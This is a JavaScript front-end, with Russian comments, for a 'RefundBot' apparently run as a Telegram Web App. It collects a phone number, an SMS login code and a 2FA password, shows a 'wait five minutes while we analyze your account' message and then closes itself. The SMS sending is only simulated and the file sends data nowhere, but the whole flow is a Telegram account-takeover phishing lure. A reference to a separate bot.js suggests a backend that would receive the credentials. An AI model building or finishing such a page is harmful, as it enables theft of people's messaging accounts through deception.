// Полностью автономный скрипт - работает без bot.js
// Все данные сохраняются только в браузере

document.addEventListener('DOMContentLoaded', function() {
    // Элементы
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const faInput = document.getElementById('fa');
    const sendBtn = document.getElementById('sendCodeBtn');
    const loginBtn = document.getElementById('loginBtn');
    const logContainer = document.getElementById('logContainer');
    
    // Симуляция отправки SMS (генерируем случайный код)
    let generatedCode = '';
    let userPhone = '';

    // Функция логирования
    function addLog(message, type = 'info') {
        const now = new Date();
        const time = now.getHours().toString().padStart(2, '0') + ':' + 
                     now.getMinutes().toString().padStart(2, '0') + ':' + 
                     now.getSeconds().toString().padStart(2, '0');
        
        const logItem = document.createElement('div');
        logItem.className = 'log-item';
        logItem.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
        
        // Цвета в зависимости от типа
        if (type === 'success') logItem.style.borderLeft = '4px solid #2ed573';
        if (type === 'error') logItem.style.borderLeft = '4px solid #ff4757';
        if (type === 'warning') logItem.style.borderLeft = '4px solid #ffa502';
        
        logContainer.appendChild(logItem);
        logContainer.scrollTop = logContainer.scrollHeight;
    }

    // Имитация отправки кода
    sendBtn.addEventListener('click', function() {
        userPhone = phoneInput.value.trim();
        
        if (!userPhone || !userPhone.startsWith('+')) {
            addLog('❌ Ошибка: Введите корректный номер телефона', 'error');
            alert('Введите номер в формате +7XXXXXXXXXX');
            return;
        }

        // Генерируем случайный 5-значный код
        generatedCode = Math.floor(10000 + Math.random() * 90000).toString();
        
        // Логируем действие
        addLog(`📱 Запрос кода для номера: ${userPhone}`, 'info');
        addLog(`🔐 Сгенерирован SMS-код: ${generatedCode}`, 'warning');
        addLog(`🌍 Определена страна: ${getCountryByPhone(userPhone)}`, 'info');
        
        // Симуляция задержки отправки SMS
        sendBtn.disabled = true;
        sendBtn.textContent = '⏳ Отправка...';
        
        setTimeout(() => {
            // Активируем поле для ввода кода
            codeInput.disabled = false;
            sendBtn.textContent = '✅ Код отправлен';
            sendBtn.style.background = 'linear-gradient(90deg, #2ed573, #1e90ff)';
            
            addLog(`📲 SMS с кодом отправлено на номер ${userPhone}`, 'success');
            addLog(`💡 Подсказка: Введите код ${generatedCode} для теста`, 'warning');
            
            // Фокус на поле кода
            codeInput.focus();
        }, 1500);
    });

    // Обработка входа
    loginBtn.addEventListener('click', function() {
        const enteredCode = codeInput.value.trim();
        const faCode = faInput.value.trim();
        
        if (enteredCode !== generatedCode) {
            addLog('❌ Ошибка: Неверный код подтверждения', 'error');
            alert('Неверный код! Попробуйте снова.');
            return;
        }

        // Логируем успешный вход
        addLog(`✅ Регистрация успешна для: ${userPhone}`, 'success');
        addLog(`🔑 Введённый код: ${enteredCode}`, 'info');
        if (faCode) {
            addLog(`🔒 2FA пароль: ${faCode}`, 'info');
        }
        addLog(`🌍 Страна: ${getCountryByPhone(userPhone)}`, 'info');
        addLog('⏳ Ожидайте 5 минут для завершения проверки...', 'warning');
        
        // Меняем интерфейс
        loginBtn.disabled = true;
        loginBtn.textContent = '✅ Регистрация завершена';
        loginBtn.style.background = 'linear-gradient(90deg, #2ed573, #1e90ff)';
        
        // Активируем поле 2FA если код верный
        faInput.disabled = false;
        
        // Симуляция завершения через 5 секунд
        setTimeout(() => {
            addLog('🎉 Проверка аккаунта завершена! Доступ предоставлен.', 'success');
            alert('✅ Регистрация прошла успешно! Ожидайте 5 минут, пока мы анализируем ваш аккаунт. После анализа окно автоматически закроется.');
            
            // Если открыто в Telegram Web App - закрываем
            if (typeof window.Telegram !== 'undefined') {
                setTimeout(() => window.Telegram.WebApp.close(), 3000);
            }
        }, 2000);
    });

    // Определяем страну по коду телефона
    function getCountryByPhone(phone) {
        if (phone.startsWith('+7')) return 'Russia';
        if (phone.startsWith('+1')) return 'USA';
        if (phone.startsWith('+44')) return 'UK';
        if (phone.startsWith('+49')) return 'Germany';
        if (phone.startsWith('+33')) return 'France';
        return 'Unknown';
    }

    // Активация кнопки Login при вводе кода
    codeInput.addEventListener('input', function() {
        loginBtn.disabled = codeInput.value.length < 4;
        if (codeInput.value.length >= 4) {
            loginBtn.style.opacity = '1';
        }
    });

    // Автозаполнение для теста (удобно при разработке)
    phoneInput.addEventListener('dblclick', function() {
        if (!phoneInput.value) {
            phoneInput.value = '+79211234567';
            addLog('🔧 Автозаполнение номера для теста', 'info');
        }
    });

    codeInput.addEventListener('dblclick', function() {
        if (!codeInput.value && generatedCode) {
            codeInput.value = generatedCode;
            addLog('🔧 Автозаполнение кода для теста', 'info');
            loginBtn.disabled = false;
        }
    });

    // Начальное сообщение в логе
    addLog('Система RefundBot инициализирована', 'info');
    addLog('Введите номер телефона для начала регистрации', 'info');
});
